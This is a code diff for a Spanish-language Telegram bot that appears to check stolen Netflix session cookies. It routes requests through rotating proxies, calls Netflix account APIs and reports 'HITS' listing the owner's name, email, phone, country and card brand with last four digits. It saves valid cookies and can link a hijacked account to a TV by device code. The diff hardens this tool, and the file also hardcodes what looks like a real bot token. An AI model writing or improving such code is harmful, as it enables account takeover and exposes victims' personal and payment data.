@@ -5,11 +5,12 @@ import random
 import logging
 import threading
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from datetime import datetime
+from datetime import datetime, timedelta
 from telegram import Update, BotCommand, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
 import requests
 import json
+from logging.handlers import RotatingFileHandler
 
 # ==========================================
 # CONFIGURACIÓN DE LOGGING
@@ -20,22 +21,34 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
+# Crear directorio logs si no existe
+os.makedirs('logs', exist_ok=True)
+
+# Configurar rotación de logs
+file_handler = RotatingFileHandler(
+    'logs/bot.log',
+    maxBytes=5*1024*1024,  # 5MB
+    backupCount=5
+)
+file_handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
+logger.addHandler(file_handler)
+
 # ==========================================
 # CONFIGURACIÓN PRINCIPAL
 # ==========================================
-TOKEN = "9224399752:AAE_iv908Ox4dO77MUdX84vVqXZmG0zPptw" # <--- REEMPLAZA CON TU TOKEN DE BOTFATHER
-ADMIN_ID = 8917082484   # <--- TU ID DE TELEGRAM
+TOKEN = os.getenv("BOT_TOKEN", "9224399752:AAE_iv908Ox4dO77MUdX84vVqXZmG0zPptw")
+ADMIN_ID = int(os.getenv("ADMIN_ID", "8917082484"))
 
 # Palabras clave para filtrar spam
 SPAM_KEYWORDS = ["luckybear", "casino", "bond", "promo", "gift", "bonus"]
 
 # Patrones para detectar códigos de TV (Formatos comunes: XXXX-XXXX, XXX-XXX)
-TV_CODE_PATTERN = re.compile(r'^[A-Z0-9]{4}-[A-Z0-9]{4}$|^[A-Z0-9]{3}-[A-Z0-9]{3}$')
+TV_CODE_PATTERN = re.compile(r'^[A-Z0-9]{4}-[A-Z0-9]{4}$|^[A-Z0-9]{3}-[A-Z0-9]{3}$|^[A-Z0-9]{2,4}-[A-Z0-9]{2,4}$')
 
 # ==========================================
 # VARIABLES GLOBALES
 # ==========================================
-user_sessions = {}  # {chat_id: {'cookies': [], 'waiting_for_cookie': bool, 'tv_code': str}}
+user_sessions = {}  # {chat_id: {'cookies': [], 'waiting_for_cookie': bool, 'tv_code': str, 'last_activity': datetime}}
 stats = {
     'checked': 0,
     'hits': 0,
@@ -47,14 +60,34 @@ stats = {
 
 PROXY_LIST = []
 
+# Lock para acceso seguro a stats
+stats_lock = threading.Lock()
+
+def update_stat(stat_name, value=1):
+    with stats_lock:
+        stats[stat_name] += value
+
 def load_proxies():
     global PROXY_LIST
     try:
         if os.path.exists('proxies.txt'):
             with open('proxies.txt', 'r', encoding='utf-8') as f:
                 lines = f.readlines()
-                PROXY_LIST = [line.strip() for line in lines if line.strip()]
-            logger.info(f"Cargados {len(PROXY_LIST)} proxies.")
+                raw_proxies = [line.strip() for line in lines if line.strip()]
+                
+            # Filtrar proxies que funcionan
+            valid_proxies = []
+            for proxy in raw_proxies:
+                try:
+                    proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
+                    response = requests.get('https://www.netflix.com', proxies=proxies, timeout=5)
+                    if response.status_code == 200:
+                        valid_proxies.append(proxy)
+                except:
+                    pass
+                    
+            PROXY_LIST = valid_proxies
+            logger.info(f"Cargados {len(PROXY_LIST)} proxies válidos.")
         else:
             PROXY_LIST = []
     except Exception as e:
@@ -65,6 +98,16 @@ def get_proxy():
     if not PROXY_LIST:
         return None
     return random.choice(PROXY_LIST)
+
+def cleanup_expired_sessions():
+    now = datetime.now()
+    expired_keys = []
+    for chat_id, session in user_sessions.items():
+        if session.get('waiting_for_cookie') and (now - session.get('last_activity', now)) > timedelta(minutes=5):
+            expired_keys.append(chat_id)
+            
+    for key in expired_keys:
+        del user_sessions[key]
 
 # ==========================================
 # LÓGICA DE CONEXIÓN CON TV
@@ -79,43 +122,40 @@ def check_tv_connection(tv_code, cookie):
         'Accept': 'application/json',
         'Content-Type': 'application/json'
     }
-    
-    # URL de la API de Netflix para iniciar sesión por código
+
     url = "https://www.netflix.com/nfpa/auth/login"
-    
+
     payload = {
         "code": tv_code,
-        "codeVerificationCode": "", 
+        "codeVerificationCode": "",
         "rememberMe": True
     }
-    
-    # Headers específicos para la petición
+
     cookies_dict = {}
     for c in cookie.split(';'):
         if '=' in c:
             k, v = c.split('=', 1)
             cookies_dict[k.strip()] = v.strip()
-            
-    response = requests.post(url, json=payload, headers=headers, cookies=cookies_dict, timeout=10)
-    
-    if response.status_code == 200:
-        data = response.json()
-        # Si la respuesta contiene tokens, significa que la TV aceptó la conexión
-        if 'token' in data or 'sessionToken' in data:
-            return True
-        elif 'error' in data:
-            return False
+
+    try:
+        response = requests.post(url, json=payload, headers=headers, cookies=cookies_dict, timeout=10)
+
+        if response.status_code == 200:
+            data = response.json()
+            if 'token' in data or 'sessionToken' in data:
+                return True
+            elif 'error' in data:
+                return False
+            else:
+                return True
         else:
-            # A veces la respuesta es 200 pero requiere confirmación manual
-            # En este caso, asumimos éxito si no hay error explícito
-            return True
-    else:
+            return False
+    except:
         return False
 
 def extract_cookies_from_message(text):
     """Extrae todas las cookies válidas de un mensaje de texto."""
     cookies = []
-    # Regex para encontrar NetflixId o SecureNetflixId
     pattern = r'(?:NetflixId|SecureNetflixId)=([^;]+)'
     matches = re.findall(pattern, text)
     for match in matches:
@@ -155,49 +195,49 @@ async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
         await update.message.reply_text("🚫 Acceso restringido.")
         return
-    
+
     total_checked = stats['checked']
     hits = stats['hits']
     bad = stats['bad']
     errors = stats['errors']
-    
+
     if total_checked > 0:
         hit_rate = (hits / total_checked) * 100
     else:
         hit_rate = 0
-        
+
     elapsed = ""
     if stats['start_time']:
         now = time.time()
         elapsed = f"{int(now - stats['start_time'])}s"
-        
+
     msg = f"📊 Estadísticas:\n"
     msg += f"✅ Hits: {hits}\n"
     msg += f"❌ Bad: {bad}\n"
     msg += f"⚠️ Errors: {errors}\n"
     msg += f"🎯 Hit Rate: {hit_rate:.2f}%\n"
     msg += f"⏱️ Tiempo: {elapsed}"
-    
+
     await update.message.reply_text(msg)
 
 async def logs_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
         await update.message.reply_text("🚫 Acceso restringido.")
         return
-        
+
     if not os.path.exists('logs/bot.log'):
         await update.message.reply_text("No hay logs disponibles.")
         return
-        
+
     try:
         with open('logs/bot.log', 'r', encoding='utf-8') as f:
             lines = f.readlines()
             last_5 = lines[-5:] if len(lines) >= 5 else lines
-            
+
         if not last_5:
             await update.message.reply_text("No hay logs recientes.")
             return
-            
+
         log_content = "".join(last_5)
         await update.message.reply_text(f"📜 Últimos 5 logs:\n```\n{log_content}\n```", parse_mode='Markdown')
     except Exception as e:
@@ -206,7 +246,7 @@ async def logs_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     text = update.message.text.strip()
-    
+
     # Spam filter
     if is_spam(text):
         await update.message.delete()
@@ -218,27 +258,25 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         session = user_sessions[user_id]
         tv_code = session.get('tv_code')
         cookie = text # Assume the whole message is the cookie
-        
+
         # Process TV connection
         await update.message.reply_text(f"⏳ Conectando dispositivo...\nCódigo detectado: {tv_code}\nPor favor, confirma en tu TV.")
-        
+
         success = check_tv_connection(tv_code, cookie)
-        
+
         if success:
-            # Generate buttons for TV connection success
             keyboard = [
                 [InlineKeyboardButton("🖥️ PC", url=f"https://www.netflix.com/login?next=&source=direct&ref_=tt_spr_btn_pc"),
                  InlineKeyboardButton("📱 Móvil", url=f"https://www.netflix.com/login?next=&source=direct&ref_=tt_spr_btn_mobile")],
                 [InlineKeyboardButton("📺 TV", url=f"https://www.netflix.com/login?next=&source=direct&ref_=tt_spr_btn_tv")]
             ]
             reply_markup = InlineKeyboardMarkup(keyboard)
-            
+
             await update.message.reply_text(
                 f"✅ ¡Conexión Exitosa!\nTu cuenta ya está activa en la Smart TV.\n\n"
                 f"🍪 Cookie: `{cookie}`",
                 reply_markup=reply_markup
             )
-            # Save to hits folder
             save_hit(cookie, "TV")
             user_sessions[user_id]['waiting_for_cookie'] = False
             user_sessions[user_id]['tv_code'] = None
@@ -252,22 +290,26 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     tv_code_match = TV_CODE_PATTERN.search(text)
     has_tv_code = bool(tv_code_match)
     extracted_cookies = extract_cookies_from_message(text)
-    
+
     if has_tv_code and not extracted_cookies:
-        # User sent only the TV code
         tv_code = tv_code_match.group(0)
-        user_sessions[user_id] = {'waiting_for_cookie': True, 'tv_code': tv_code}
+        user_sessions[user_id] = {'waiting_for_cookie': True, 'tv_code': tv_code, 'last_activity': datetime.now()}
         await update.message.reply_text(f"📺 Código detectado: {tv_code}\nAhora, por favor envía la cookie para conectar.")
         return
 
     # Normal processing: Add to queue or process immediately if single
     if user_id not in user_sessions:
-        user_sessions[user_id] = {'cookies': [], 'waiting_for_cookie': False, 'tv_code': None}
-        
+        user_sessions[user_id] = {'cookies': [], 'waiting_for_cookie': False, 'tv_code': None, 'last_activity': datetime.now()}
+
     session = user_sessions[user_id]
-    
+    session['last_activity'] = datetime.now()
+
     # If we are in batch mode (user sends multiple messages), add to queue
     if len(extracted_cookies) > 0:
+        if len(session['cookies']) >= 100:  # Límite de cookies por usuario
+            await update.message.reply_text("⚠️ Has alcanzado el límite de 100 cookies.")
+            return
+            
         session['cookies'].extend(extracted_cookies)
         await update.message.reply_text(f"📦 Cookie almacenada! ({len(session['cookies'])} en fila)")
     else:
@@ -278,12 +320,12 @@ async def done_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if user_id not in user_sessions or not user_sessions[user_id]['cookies']:
         await update.message.reply_text("No hay cookies en la cola.")
         return
-        
+
     cookies = user_sessions[user_id]['cookies']
     user_sessions[user_id]['cookies'] = [] # Clear queue
-    
+
     await update.message.reply_text(f"🔄 Procesando {len(cookies)} cookies...")
-    
+
     # Process in threads
     results = []
     with ThreadPoolExecutor(max_workers=5) as executor:
@@ -291,131 +333,133 @@ async def done_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         for future in as_completed(futures):
             result = future.result()
             results.append((futures[future], result))
-    
+
     # Sort results by original index
     results.sort(key=lambda x: x[0].index)
-    
+
     for _, result in results:
         if result:
             await update.message.reply_text(result, parse_mode='HTML', disable_web_page_preview=True)
-            
+
     await update.message.reply_text(f"✅ Proceso completado!")
 
 def check_single_cookie(cookie):
     """Verifica una sola cookie y devuelve el mensaje formateado."""
     global stats
-    stats['checked'] += 1
     
+    update_stat('checked')
+
     proxy = get_proxy()
     proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'} if proxy else None
-    
+
     try:
-        # Request to get account info
         headers = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
             'Accept': 'application/json',
             'Content-Type': 'application/json'
         }
-        
+
         cookies_dict = {}
         for c in cookie.split(';'):
             if '=' in c:
                 k, v = c.split('=', 1)
                 cookies_dict[k.strip()] = v.strip()
-                
-        # Try to get profile list first
+
         profile_url = "https://www.netflix.com/api/shakti/profiles"
         response = requests.get(profile_url, headers=headers, cookies=cookies_dict, proxies=proxies, timeout=10)
-        
+
         if response.status_code == 200:
-            profiles_data = response.json()
+            try:
+                profiles_data = response.json()
+            except ValueError:
+                update_stat('bad')
+                return "❌ Cookie inválida (JSON inválido)"
+                
             main_profile = None
             for p in profiles_data.get('items', []):
                 if p.get('isMainProfile'):
                     main_profile = p
                     break
-            
+
             if not main_profile:
-                main_profile = profiles_data['items'][0] if profiles_data['items'] else None
-                
+                main_profile = profiles_data['items'][0] if profiles_data.get('items') else None
+
             if main_profile:
                 profile_id = main_profile['id']
-                nftoken = cookies_dict.get('nflxToken', '')
-                
-                # Get detailed account info
+                nflx_token = cookies_dict.get('nflxToken', '')
+
                 account_url = f"https://www.netflix.com/api/v2/profile/{profile_id}/account"
                 account_response = requests.get(account_url, headers=headers, cookies=cookies_dict, proxies=proxies, timeout=10)
-                
+
                 if account_response.status_code == 200:
-                    account_data = account_response.json()
-                    
-                    # Extract info
-                    name = account_data.get('subscriberName', 'N/A')
-                    email = account_data.get('email', 'N/A')
-                    plan_type = account_data.get('currentCycle', {}).get('planDescriptor', {}).get('name', 'N/A')
-                    country = account_data.get('billingAddress', {}).get('country', 'N/A')
-                    card_brand = account_data.get('paymentInfo', {}).get('cardBrand', 'N/A')
-                    card_last_four = account_data.get('paymentInfo', {}).get('lastFourDigits', 'N/A')
-                    member_since = account_data.get('memberSinceDate', 'N/A')
-                    next_billing_date = account_data.get('nextBillingDate', 'N/A')
-                    video_quality = account_data.get('currentCycle', {}).get('features', {}).get('videoQuality', 'N/A')
-                    max_streams = account_data.get('currentCycle', {}).get('features', {}).get('maxStreamingDevices', 'N/A')
-                    extra_slots = account_data.get('currentCycle', {}).get('features', {}).get('maxProfiles', 'N/A')
-                    phone = account_data.get('phoneNumber', 'N/A')
-                    verified = account_data.get('phoneNumberVerified', False)
-                    
-                    # Format dates
                     try:
-                        member_since_dt = datetime.fromtimestamp(member_since / 1000)
-                        member_since_str = member_since_dt.strftime("%Y-%m-%d")
-                    except:
-                        member_since_str = str(member_since)
-                        
-                    try:
-                        next_billing_dt = datetime.fromtimestamp(next_billing_date / 1000)
-                        next_billing_str = next_billing_dt.strftime("%Y-%m-%d")
-                    except:
-                        next_billing_str = str(next_billing_date)
-                        
-                    # Build message
-                    msg = f"✅ <b>HIT DETECTADO</b>\n\n"
-                    msg += f"👤 <b>Nombre:</b> {name}\n"
-                    msg += f"📧 <b>Email:</b> {email}\n"
-                    msg += f"🌍 <b>País:</b> {country}\n"
-                    msg += f"💎 <b>Plan:</b> {plan_type}\n"
-                    msg += f"📅 <b>Miembro desde:</b> {member_since_str}\n"
-                    msg += f"💳 <b>Tarjeta:</b> {card_brand} ****{card_last_four}\n"
-                    msg += f"📞 <b>Teléfono:</b> {phone} ({'✅ Verificado' if verified else '❌ No verificado'})\n"
-                    msg += f"📺 <b>Calidad:</b> {video_quality}\n"
-                    msg += f"👥 <b>Perfiles:</b> {extra_slots}\n"
-                    msg += f"🚀 <b>Streams máx:</b> {max_streams}\n"
-                    msg += f"💰 <b>Próximo pago:</b> {next_billing_str}\n\n"
-                    msg += f"🍪 <b>Cookie:</b> `{cookie}`\n"
-                    
-                    # Generate buttons
-                    keyboard = [
-                        [InlineKeyboardButton("🖥️ PC", url=f"https://www.netflix.com/login?next=&source=direct&ref_=tt_spr_btn_pc"),
-                         InlineKeyboardButton("📱 Móvil", url=f"https://www.netflix.com/login?next=&source=direct&ref_=tt_spr_btn_mobile")],
-                        [InlineKeyboardButton("📺 TV", url=f"https://www.netflix.com/login?next=&source=direct&ref_=tt_spr_btn_tv")]
-                    ]
-                    reply_markup = InlineKeyboardMarkup(keyboard)
-                    
-                    stats['hits'] += 1
-                    save_hit(cookie, name)
-                    return msg
-                    
+                        account_data = account_response.json()
+
+                        name = account_data.get('subscriberName', 'N/A')
+                        email = account_data.get('email', 'N/A')
+                        plan_type = account_data.get('currentCycle', {}).get('planDescriptor', {}).get('name', 'N/A')
+                        country = account_data.get('billingAddress', {}).get('country', 'N/A')
+                        card_brand = account_data.get('paymentInfo', {}).get('cardBrand', 'N/A')
+                        card_last_four = account_data.get('paymentInfo', {}).get('lastFourDigits', 'N/A')
+                        member_since = account_data.get('memberSinceDate', 'N/A')
+                        next_billing_date = account_data.get('nextBillingDate', 'N/A')
+                        video_quality = account_data.get('currentCycle', {}).get('features', {}).get('videoQuality', 'N/A')
+                        max_streams = account_data.get('currentCycle', {}).get('features', {}).get('maxStreamingDevices', 'N/A')
+                        extra_slots = account_data.get('currentCycle', {}).get('features', {}).get('maxProfiles', 'N/A')
+                        phone = account_data.get('phoneNumber', 'N/A')
+                        verified = account_data.get('phoneNumberVerified', False)
+
+                        try:
+                            member_since_dt = datetime.fromtimestamp(member_since / 1000)
+                            member_since_str = member_since_dt.strftime("%Y-%m-%d")
+                        except:
+                            member_since_str = str(member_since)
+
+                        try:
+                            next_billing_dt = datetime.fromtimestamp(next_billing_date / 1000)
+                            next_billing_str = next_billing_dt.strftime("%Y-%m-%d")
+                        except:
+                            next_billing_str = str(next_billing_date)
+
+                        msg = f"✅ <b>HIT DETECTADO</b>\n\n"
+                        msg += f"👤 <b>Nombre:</b> {name}\n"
+                        msg += f"📧 <b>Email:</b> {email}\n"
+                        msg += f"🌍 <b>País:</b> {country}\n"
+                        msg += f"💎 <b>Plan:</b> {plan_type}\n"
+                        msg += f"📅 <b>Miembro desde:</b> {member_since_str}\n"
+                        msg += f"💳 <b>Tarjeta:</b> {card_brand} ****{card_last_four}\n"
+                        msg += f"📞 <b>Teléfono:</b> {phone} ({'✅ Verificado' if verified else '❌ No verificado'})\n"
+                        msg += f"📺 <b>Calidad:</b> {video_quality}\n"
+                        msg += f"👥 <b>Perfiles:</b> {extra_slots}\n"
+                        msg += f"🚀 <b>Streams máx:</b> {max_streams}\n"
+                        msg += f"💰 <b>Próximo pago:</b> {next_billing_str}\n\n"
+                        msg += f"🍪 <b>Cookie:</b> `{cookie}`\n"
+
+                        keyboard = [
+                            [InlineKeyboardButton("🖥️ PC", url=f"https://www.netflix.com/login?next=&source=direct&ref_=tt_spr_btn_pc"),
+                             InlineKeyboardButton("📱 Móvil", url=f"https://www.netflix.com/login?next=&source=direct&ref_=tt_spr_btn_mobile")],
+                            [InlineKeyboardButton("📺 TV", url=f"https://www.netflix.com/login?next=&source=direct&ref_=tt_spr_btn_tv")]
+                        ]
+                        reply_markup = InlineKeyboardMarkup(keyboard)
+
+                        update_stat('hits')
+                        save_hit(cookie, name)
+                        return msg
+                    except ValueError:
+                        update_stat('bad')
+                        return "❌ Cookie inválida (Error al parsear JSON)"
                 else:
-                    stats['bad'] += 1
+                    update_stat('bad')
                     return "❌ Cookie inválida (Error al obtener cuenta)"
             else:
-                stats['bad'] += 1
+                update_stat('bad')
                 return "❌ Cookie inválida (No se encontró perfil principal)"
         else:
-            stats['bad'] += 1
+            update_stat('bad')
             return "❌ Cookie inválida (Error de perfil)"
-            
+
     except Exception as e:
-        stats['errors'] += 1
+        update_stat('errors')
         logger.error(f"Error checking cookie: {e}")
         return f"⚠️ Error: {str(e)}"
 
@@ -435,18 +479,18 @@ def save_hit(cookie, name):
 
 def main():
     load_proxies()
-    
+
     app = ApplicationBuilder().token(TOKEN).build()
-    
+
     start_handler = CommandHandler('start', start)
     help_handler = CommandHandler('help', help_command)
     stats_handler = CommandHandler('stats', stats_command)
     logs_handler = CommandHandler('logs', logs_command)
     done_handler = CommandHandler('done', done_command)
     cancel_handler = CommandHandler('cancel', lambda update, context: update.message.reply_text("Cola vaciada.") or setattr(user_sessions.get(update.effective_user.id, {}), 'cookies', []) if update.effective_user.id in user_sessions else None)
-    
+
     message_handler = MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message)
-    
+
     app.add_handler(start_handler)
     app.add_handler(help_handler)
     app.add_handler(stats_handler)
@@ -454,7 +498,7 @@ def main():
     app.add_handler(done_handler)
     app.add_handler(cancel_handler)
     app.add_handler(message_handler)
-    
+
     logger.info("Bot starting...")
     app.run_polling()
 
